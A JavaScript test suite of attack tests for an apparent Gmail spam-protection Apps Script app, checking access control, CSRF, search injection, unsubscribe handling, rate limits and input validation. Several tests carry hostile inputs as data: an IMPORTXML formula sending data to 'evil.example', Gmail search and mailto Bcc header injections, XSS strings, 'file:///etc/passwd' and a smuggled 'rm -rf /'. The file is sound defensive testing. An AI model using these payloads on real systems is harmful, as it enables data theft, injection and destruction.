// Attack tests: each one tries to break a protection in the real src/*.gs code, run against a fake Gmail.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { buildBundle } from '../scripts/build-web.mjs';
import { loadApp, makeMessage, OWNER, AUTH_PASS, DAY_MS } from './harness.mjs';

const CODE = fs.readFileSync(new URL('../src/Code.gs', import.meta.url), 'utf8');
const DETECT = fs.readFileSync(new URL('../src/Detect.gs', import.meta.url), 'utf8');
const old = (days) => new Date(Date.now() - days * DAY_MS);

test('only the owner can use the dashboard and its API', () => {
  for (const intruder of ['attacker@example.com', '', null]) {
    const { app, env } = loadApp({ activeUser: intruder });
    const r = app.apiOverview();
    assert.equal(r.ok, false);
    assert.equal(r.error, 'Not allowed.');
    assert.equal(app.apiSettings().ok, false);
    assert.equal(app.apiWebsiteAction('a@b.com', 'block').ok, false);
    const page = app.doGet({ parameter: {} });
    assert.match(page.getContent(), /Not allowed/);
    assert.doesNotMatch(page.getContent(), /google\.script\.run/);
    assert.ok(app.recentActivity_(5).some((a) => a.event === 'Access denied'), 'denied access is logged');
    assert.doesNotMatch(page.getContent(), /accounts\.google\.com/, 'no permission link unless Google actually needs one');
  }
  const { app } = loadApp();
  const page = app.doGet({ parameter: {} });
  assert.match(page.getContent(), /google\.script\.run/);
  assert.equal(page.xfo, 'DEFAULT', 'the dashboard cannot be framed by other sites');
});

test('a link cannot change anything (no CSRF by GET) and there is no POST endpoint', () => {
  const { app, env } = loadApp();
  app.installTriggers_(app.getSettings_());
  const before = env.triggers.length;
  app.doGet({ parameter: { action: 'turnOff', fn: 'apiTurnOff' }, queryString: 'action=turnOff' });
  assert.equal(env.triggers.length, before);
  assert.equal(typeof app.doPost, 'undefined');
});

test('the page can only call the intended functions; everything else is private', () => {
  const publicFns = new Set();
  for (const src of [CODE, DETECT]) for (const m of src.matchAll(/^function\s+([A-Za-z0-9_$]+)/gm)) if (!m[1].endsWith('_')) publicFns.add(m[1]);
  const allowed = new Set(['setup', 'turnOff', 'runGuard', 'runNightly', 'runScanBatch', 'doGet', 'apiOverview', 'apiQuarantine', 'apiQuarantineAction',
    'apiReview', 'apiReviewDecision', 'apiWebsites', 'apiCountFrom', 'apiWebsiteAction', 'apiOutgoing', 'apiDeleteDrafts', 'apiSettings',
    'apiSaveSettings', 'apiSetKey', 'apiUpdateList', 'apiCheckNow', 'apiTurnOff', 'apiTurnOn']);
  assert.deepEqual([...publicFns].sort(), [...allowed].sort());
  for (const name of publicFns) {
    if (!name.startsWith('api')) continue;
    const body = CODE.slice(CODE.indexOf('function ' + name + '('), CODE.indexOf('\n}\n', CODE.indexOf('function ' + name + '(')));
    assert.match(body, /return guarded_\(/, name + ' must go through the owner check');
  }
  assert.match(CODE, /function turnOff\(\) \{\n  requireUser_\(\);/, 'turnOff checks the owner too');
  assert.match(CODE, /function setup\(\) \{\n  requireUser_\(\);/, 'setup checks the owner too');
});

test('Gmail search injection: a crafted address cannot widen a delete', () => {
  const { app, env } = loadApp();
  for (const bad of ['x@y.com OR in:anywhere', 'x@y.com) OR (is:starred', '"x"@y.com', '-x@y.com', 'x@y.com label:work', '{x@y.com}', 'x@y.com\nin:trash']) {
    assert.throws(() => app.fromQuery_(bad), /not a valid/);
    const r = app.apiWebsiteAction(bad, 'block');
    assert.equal(r.ok, false);
  }
  assert.ok(!env.queries.some((q) => /anywhere|is:starred \)|label:work/.test(q)), 'no injected search ever ran');
  assert.equal(app.fromQuery_('News@Shop.co.za'), 'from:news@shop.co.za');
  // A tampered review item: the delete search comes from the key's checked parts, never from stored text.
  assert.throws(() => app.reviewQuery_('sender:a@b.com OR is:starred', app.getSettings_()), /not a valid/);
  assert.throws(() => app.reviewQuery_('rule:everything', app.getSettings_()), /Unknown review item/);
  assert.match(app.reviewQuery_('rule:promotions', app.getSettings_()), /-is:starred -is:important -has:userlabels/);
});

test('stored text comes back exactly as it went in (formulas, scripts, emoji, other alphabets)', () => {
  const { app, env } = loadApp();
  const evil = '=IMPORTXML("https://evil.example/?q="&A1,"//a") <script>x</script> \u{1F600} Привет \u2028 "quotes" \\ back';
  const t = env.addThread(makeMessage({ from: `"${evil}" <news@shop.example>`, subject: '+HYPERLINK("x")',
    headers: { 'List-Unsubscribe': '<https://shop.example/u?id=1>' } }), { category: 'promotions' });
  const table = app.loadWebsites_();
  app.aggregate_(table, t.getMessages()[0], [OWNER]);
  app.saveWebsites_(table);
  app.log_('Test', evil, '-1+2', 5, '@SUM(A1)', 'abc');
  assert.equal(app.loadWebsites_().byEmail['news@shop.example'].name, app.clip_(evil, 60));
  const a = app.recentActivity_(1)[0];
  assert.equal(a.from, app.clip_(evil, 120));
  assert.equal(a.details, '@SUM(A1)');
  for (const [k, v] of env.props) assert.ok(Buffer.byteLength(v) <= 9216, k + ' fits in one property');
  assert.ok([...env.props.values()].every((v) => /^[\x00-\x7f]*$/.test(v)), 'stored as plain ASCII, so a piece never splits a character');
});

test('a huge mailbox never overflows Google storage: the senders who email most are kept', () => {
  const { app, env } = loadApp();
  const table = app.loadWebsites_();
  for (let i = 0; i < 3000; i++) {
    const rec = app.newRecord_(`newsletter${i}@sender-number-${i}.example`, 'Sender ' + i + ' '.padEnd(50, 'x'), `sender-number-${i}.example`);
    rec.emails = i; rec.last = new Date(); rec.flags.list = true;
    rec.meta = { u: 'https://sender-number-' + i + '.example/unsubscribe?token=' + 'a'.repeat(400), m: 'mailto:u@sender-number-' + i + '.example?subject=' + 'b'.repeat(200), oc: true };
    table.byEmail[rec.email] = rec; table.order.push(rec);
  }
  for (let i = 0; i < 400; i++) app.log_('Dangerous', 'x'.repeat(120), 'y'.repeat(140), 90, 'z'.repeat(400), 'abc');
  const kept = app.saveWebsites_(table);
  assert.ok(kept >= 100 && kept <= 500, 'kept ' + kept);
  assert.ok(env.storeBytes() <= 500 * 1024);
  const back = app.loadWebsites_().order;
  assert.equal(back.length, kept);
  assert.ok(back.every((r) => r.emails >= 3000 - kept), 'the biggest senders are the ones kept');
  assert.equal(app.recentActivity_(1000).length, app.LOG_MAX, 'the activity log is capped');
  assert.equal(app.apiOverview().ok, true, 'everything still works when storage is nearly full');
});

test('unsubscribe links: only plain https on a public name is ever fetched or shown', () => {
  const { app } = loadApp();
  const bad = ['javascript:alert(1)', 'http://shop.example/u', 'data:text/html,x', 'file:///etc/passwd', 'https://user@shop.example/u',
    'https://127.0.0.1/u', 'https://10.0.0.5/u', 'https://[::1]/u', 'https://localhost/u', 'https://printer.local/u', 'https://2130706433/u',
    'https://shop.example/u"><script>alert(1)</script>', 'https://shop.example/' + 'a'.repeat(2100), ' https://shop.example/u\n'];
  for (const u of bad.slice(0, -1)) assert.equal(app.safeHttpsUrl_(u), false, u);
  assert.equal(app.safeHttpsUrl_('https://list.shop.example/u?id=1&t=2'), true);
});

test('mailto unsubscribe cannot add hidden recipients or headers', () => {
  const { app, env } = loadApp();
  const m = app.parseMailto_('mailto:unsub@shop.example?subject=bye%0D%0ABcc:victim@example.org&bcc=victim@example.org&body=stop%0Aplease');
  assert.equal(m.to, 'unsub@shop.example');
  assert.doesNotMatch(m.subject + m.body, /[\r\n]/);
  assert.equal(app.parseMailto_('mailto:a@b.com,c@d.com?subject=x'), null, 'several recipients are refused');
  const rec = app.newRecord_('news@shop.example', 'Shop', 'shop.example');
  rec.meta = { u: '', m: 'mailto:unsub@shop.example?subject=bye%0D%0ABcc:victim@example.org&bcc=victim@example.org', oc: false };
  app.unsubscribe_(rec);
  assert.equal(env.sent.length, 1);
  assert.equal(env.sent[0].to, 'unsub@shop.example', 'only the one listed address gets the email');
  assert.doesNotMatch(env.sent[0].subject + env.sent[0].body, /[\r\n]/, 'no line breaks, so no extra headers such as Bcc');
});

test('no unsubscribing from a sender that looked suspicious (it would confirm your address)', () => {
  const { app, env } = loadApp();
  app.markSuspiciousSender_('spam@bad.example');
  const rec = app.newRecord_('spam@bad.example', 'x', 'bad.example');
  rec.meta = { u: 'https://bad.example/u', m: '', oc: true };
  assert.throws(() => app.unsubscribe_(rec), /Block instead/);
  assert.equal(env.fetchLog.length, 0);
});

test('one-click unsubscribe uses the RFC 8058 POST and does not follow redirects', () => {
  const { app, env } = loadApp();
  const rec = app.newRecord_('news@shop.example', 'Shop', 'shop.example');
  rec.meta = { u: 'https://shop.example/u?id=1', m: '', oc: true };
  assert.deepEqual({ ...app.unsubscribe_(rec) }, { done: true, how: 'one-click' });
  const call = env.fetchLog[0];
  assert.equal(call.params.method, 'post');
  assert.equal(call.params.payload, 'List-Unsubscribe=One-Click');
  assert.equal(call.params.followRedirects, false);
});

test('rate limits: API calls per minute, and unsubscribes per hour', () => {
  const { app } = loadApp();
  let last;
  for (let i = 0; i < 121; i++) last = app.apiSettings();
  assert.equal(last.ok, false);
  assert.match(last.error, /Too many requests/);
  const fresh = loadApp();
  fresh.env.addThread(makeMessage({ from: 'news@shop.example', headers: { 'List-Unsubscribe': '<https://shop.example/u>', 'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click' } }));
  const table = fresh.app.loadWebsites_();
  fresh.app.aggregate_(table, fresh.env.threads[0].getMessages()[0], [OWNER]);
  fresh.app.saveWebsites_(table);
  let r;
  for (let i = 0; i < 21; i++) r = fresh.app.apiWebsiteAction('news@shop.example', 'unsubscribe');
  assert.equal(r.ok, false);
  assert.match(r.error, /Too many requests/);
});

test('settings are checked on the server; unsafe values are refused', () => {
  const { app } = loadApp();
  for (const bad of [{ dangerousScore: 5 }, { checkEveryMinutes: 2 }, { promoDays: '5; DROP TABLE' }, { codeDays: true }, { alertEmails: 'yes' },
    { owner: 'attacker@example.com' }, { suspiciousScore: 80, dangerousScore: 60 }, null, [1, 2]]) {
    const r = app.apiSaveSettings(bad);
    assert.equal(r.ok, false, JSON.stringify(bad));
  }
  assert.equal(app.ownerEmail_(), OWNER, 'owner cannot be changed through settings');
  const ok = app.apiSaveSettings({ checkEveryMinutes: 10, promoDays: '60' });
  assert.equal(ok.ok, true);
  assert.equal(ok.data.promoDays, 60);
});

test('API keys are write-only, masked, and never logged', () => {
  const { app, env } = loadApp();
  const key = 'AIzaSyD-THIS_IS_A_TEST_KEY_1234567890';
  assert.equal(app.apiSetKey('safebrowsing', key).ok, true);
  assert.equal(app.apiSetKey('virustotal', '<script>').ok, false);
  assert.equal(app.apiSetKey('owner', key).ok, false);
  const s = JSON.stringify(app.apiSettings());
  assert.ok(!s.includes(key), 'the key is never sent back to the page');
  assert.match(s, /AIza… \(36 characters\)|AIza\\u2026|AIza… \(\d+ characters\)/);
  // A failing lookup must not write the URL (which carries the key) to the log.
  env.fetchResponder = (url) => new Error('Request failed for ' + url);
  const t = env.addThread(makeMessage({ from: 'x@example.org', subject: 'hi', html: '<a href="https://example.net/x">x</a>', attachments: [{ name: 'a.zip', bytes: Buffer.from('PK') }] }));
  app.runGuard();
  const everything = JSON.stringify([...env.props].filter(([k]) => !/^key_/.test(k))) + env.logs.join(' ');
  assert.ok(!everything.includes(key), 'key leaked into the logs');
  assert.ok(t);
});

test('unexpected errors return a plain message, never a stack trace', () => {
  const { app } = loadApp();
  app.GmailApp.getUserLabelByName = () => { throw new Error('internal detail at Code.gs:42'); };
  const r = app.apiOverview();
  assert.equal(r.ok, false);
  assert.doesNotMatch(r.error, /Code\.gs|at |internal detail/);
});

test('nothing is removed until you approve it, and only what you approved', () => {
  const { app, env } = loadApp();
  const promo = env.addThread(makeMessage({ from: 'deals@shop.example', date: old(60) }), { category: 'promotions', inbox: false });
  const starred = env.addThread(makeMessage({ from: 'deals@shop.example', date: old(60) }), { category: 'promotions', starred: true });
  const recent = env.addThread(makeMessage({ from: 'deals@shop.example', date: old(2) }), { category: 'promotions' });
  const personal = env.addThread(makeMessage({ from: 'friend@example.org', date: old(400) }));
  app.runNightly();
  assert.equal(env.trashed.length, 0, 'the nightly run only builds the review list');
  const items = app.apiReview().data;
  const promos = items.find((i) => i.key === 'rule:promotions');
  assert.equal(promos.count, '1');
  assert.equal(app.apiReviewDecision('rule:promotions', 'remove').ok, true);
  assert.deepEqual(env.trashed, [promo.id]);
  assert.ok(!starred.trash && !recent.trash && !personal.trash);
  assert.equal(app.apiReviewDecision('rule:not-a-thing', 'remove').ok, false);
});

test('quarantine actions only work on quarantined mail', () => {
  const { app, env } = loadApp();
  const normal = env.addThread(makeMessage({ from: 'boss@work.example', subject: 'Payroll' }));
  const r = app.apiQuarantineAction(normal.id, 'remove', false);
  assert.equal(r.ok, false);
  assert.equal(normal.trash, false);
  assert.equal(app.apiQuarantineAction('../../etc', 'remove', false).ok, false);
});

test('drafts: only the old drafts you picked are deleted', () => {
  const { app, env } = loadApp();
  const oldDraft = env.addDraft(makeMessage({ from: OWNER, subject: 'old', date: old(800) }), 'r111');
  const newDraft = env.addDraft(makeMessage({ from: OWNER, subject: 'new', date: old(3) }), 'r222');
  assert.equal(app.apiDeleteDrafts(['r111', 'r222']).data, 1);
  assert.equal(oldDraft.deleted, true);
  assert.equal(newDraft.deleted, false, 'a recent draft is never deleted from this page');
  assert.equal(app.apiDeleteDrafts(['../x']).ok, false);
  assert.equal(app.apiDeleteDrafts(new Array(101).fill('r1')).ok, false);
});

test('inbox guard: phishing is moved out of the inbox (not deleted); normal mail is untouched', () => {
  const { app, env } = loadApp();
  const phish = env.addThread(makeMessage({ from: 'Absa Bank <absa.alerts@gmail.com>', subject: 'Account suspended',
    plain: 'Your account has been suspended. Verify your identity to restore access.', headers: { 'Authentication-Results': 'dmarc=pass' } }));
  const malware = env.addThread(makeMessage({ from: 'friend@example.org', subject: 'invoice', attachments: [{ name: 'invoice.pdf.exe' }] }));
  const normal = env.addThread(makeMessage({ from: 'Uber Receipts <noreply@uber.com>', subject: 'Your trip', headers: { 'Authentication-Results': AUTH_PASS } }));
  app.updateList_('block', 'add', '@spam.example');
  const blocked = env.addThread(makeMessage({ from: 'x@mail.spam.example', subject: 'buy' }));
  app.runGuard();
  assert.equal(phish.inbox, false); assert.equal(phish.trash, false);
  assert.ok(phish.labels.has('EmailSpamdetection/Dangerous'));
  assert.ok(malware.labels.has('EmailSpamdetection/Dangerous'));
  assert.equal(normal.inbox, true); assert.equal(normal.labels.size, 0);
  assert.equal(blocked.trash, true, 'a sender you blocked goes to Trash');
  const before = env.threads.map((t) => [t.inbox, t.trash, [...t.labels].join()]).join();
  app.runGuard();
  assert.equal(env.threads.map((t) => [t.inbox, t.trash, [...t.labels].join()]).join(), before, 'a second run changes nothing');
});

test('outbox watch: a mass email from your account raises one alert, emailed at most once an hour', () => {
  const { app, env } = loadApp();
  const many = Array.from({ length: 30 }, (_, i) => `p${i}@example.org`).join(', ');
  env.addThread(makeMessage({ from: OWNER, to: many, subject: 'Check this out' }), { sent: true, inbox: false });
  app.checkOutgoing_(app.getSettings_(), true);
  env.addThread(makeMessage({ from: OWNER, to: many, subject: 'Again' }), { sent: true, inbox: false });
  app.checkOutgoing_(app.getSettings_(), true);
  assert.equal(app.getAlerts_().length, 2);
  assert.equal(env.sent.filter((m) => m.to === OWNER).length, 1, 'alert email is rate-limited');
});

test('stored state stays inside Apps Script property limits', () => {
  const { app, env } = loadApp();
  const seen = {};
  for (let i = 0; i < 2000; i++) seen['1a' + i.toString(16).padStart(14, '0')] = 29000000 + i;
  app.saveSeen_(seen);
  assert.ok(env.props.get('guardSeen').length < 9000);
  for (let i = 0; i < 400; i++) app.markSuspiciousSender_(`sender${i}@example-domain-number-${i}.com`);
  assert.ok(env.props.get('susSenders').length < 9216);
});

test('one-file install: the pasted app runs, shows the dashboard and uses your time zone', () => {
  const { app, env } = loadApp({ bundle: true, setup: false });
  app.HtmlService.createHtmlOutputFromFile = () => { throw new Error('a pasted install has no Dashboard.html file'); };
  const page = app.doGet({ parameter: {} });
  assert.equal(page.getContent(), fs.readFileSync(new URL('../src/Dashboard.html', import.meta.url), 'utf8'));
  const r = app.apiTurnOn('Africa/Johannesburg');
  assert.equal(r.ok, true, r.error);
  assert.deepEqual(env.triggers.map((t) => t.getHandlerFunction()).sort(), ['runGuard', 'runNightly', 'runScanBatch']);
  assert.equal(env.triggers.find((t) => t.getHandlerFunction() === 'runNightly')._t.tz, 'Africa/Johannesburg');
  assert.equal(env.props.get('owner'), OWNER);
  assert.equal(env.scriptProps.size, 0, 'nothing is kept in shared script storage');
});

test('time zones from the page are checked; a bad one falls back safely', () => {
  for (const bad of ['../../etc/passwd', 'Europe/London; rm -rf /', 'a'.repeat(60), '<script>', null, 42, { tz: 'x' }]) {
    const { app, env } = loadApp();
    assert.equal(app.apiTurnOn(bad).ok, true, String(bad));
    assert.equal(env.props.get('tz'), undefined, 'not stored: ' + String(bad));
  }
  const { app, env } = loadApp();
  assert.equal(app.apiTurnOn('Atlantis/Lost_City').ok, true, 'an unknown zone that looks valid still turns protection on');
  assert.ok(env.triggers.some((t) => t.getHandlerFunction() === 'runNightly'), 'nightly job still scheduled');
});

test('missing Google permission: a plain message and only a Google sign-in link', () => {
  const { app, env } = loadApp();
  env.authRequired = true;
  app.GmailApp.getUserLabelByName = () => { throw new Error('You do not have permission to call GmailApp.getUserLabelByName. Required permissions: https://mail.google.com/'); };
  let r = app.apiOverview();
  assert.equal(r.ok, false);
  assert.match(r.error, /permission/);
  assert.equal(r.authUrl, env.authUrl);
  for (const bad of ['javascript:alert(1)', 'https://evil.example/oauth', 'http://accounts.google.com/x', 'https://accounts.google.com.evil.example/x']) {
    env.authUrl = bad;
    r = app.apiOverview();
    assert.equal(r.authUrl, '', bad);
  }
  env.authUrl = 'https://accounts.google.com/o/oauth2/auth?a=1&b=2';
  const denied = loadApp({ activeUser: '' });
  denied.env.authRequired = true;
  denied.env.authUrl = env.authUrl;
  const page = denied.app.doGet({ parameter: {} }).getContent();
  assert.match(page, /href="https:\/\/accounts\.google\.com\/o\/oauth2\/auth\?a=1&amp;b=2"/, 'link shown, escaped for HTML');
  assert.equal(denied.app.htmlEscape_('"><script>&\''), '&quot;&gt;&lt;script&gt;&amp;&#39;');
  assert.doesNotMatch(page, /google\.script\.run/);
});

test('lost app link: the first turn-on emails you your own app link, once, and only a Google address', () => {
  const { app, env } = loadApp({ setup: false });
  let r = app.apiTurnOn('Africa/Johannesburg');
  assert.equal(r.ok, true, r.error);
  assert.match(r.data, /link is in your Gmail/);
  const links = env.sent.filter((m) => /your app link/.test(m.subject));
  assert.equal(links.length, 1);
  assert.equal(links[0].to, OWNER, 'sent only to you');
  assert.ok(links[0].body.includes(env.serviceUrl));
  assert.equal(app.apiTurnOn('Africa/Johannesburg').ok, true);
  assert.equal(env.sent.filter((m) => /your app link/.test(m.subject)).length, 1, 'not sent again');
  for (const bad of ['javascript:alert(1)', 'https://evil.example/macros/s/abc/exec', 'https://script.google.com.evil.example/macros/s/abc/exec',
    'https://script.google.com/macros/s/abc/exec?next=https://evil.example', null]) {
    const fresh = loadApp({ setup: false });
    fresh.env.serviceUrl = bad;
    r = fresh.app.apiTurnOn('');
    assert.equal(r.ok, true, 'turning on still works: ' + bad);
    assert.equal(fresh.env.sent.filter((m) => /your app link/.test(m.subject)).length, 0, 'no email for ' + bad);
  }
});

test('one-file install survives pasting: short lines, a visible end line, and Run starts protection', () => {
  const text = buildBundle().text;
  const lines = text.split('\n');
  const longest = Math.max(...lines.map((l) => l.length));
  assert.ok(longest <= 1000, 'longest line is ' + longest + ' characters');
  assert.match(lines.filter(Boolean).pop(), /^\/\/ End of EmailSpamdetection [0-9.]+\./);
  const firstPublic = (/^function ([A-Za-z0-9]*[A-Za-z0-9])\(/m.exec(text.replace(/^function [A-Za-z0-9]*_\(.*$/gm, '')) || [])[1];
  assert.equal(firstPublic, 'setup', 'Run in the editor picks setup by default');

  const { app, env } = loadApp({ bundle: true, setup: false });
  env.logs = [];
  app.console.log = (...a) => env.logs.push(a.join(' '));
  assert.match(app.setup(), /Protection is on/);
  assert.ok(env.logs.some((l) => l.includes('Your dashboard: ' + env.serviceUrl)), 'the Execution log shows the dashboard link');
});

test('a cut-off paste explains itself instead of a Google error', () => {
  const { app } = loadApp();
  app.HtmlService.createHtmlOutputFromFile = () => { throw new Error('No HTML file named Dashboard was found.'); };
  const page = app.doGet({ parameter: {} }).getContent();
  assert.match(page, /cut off/);
  assert.match(page, /End of EmailSpamdetection/);
  assert.doesNotMatch(page, /google\.script\.run/);
});
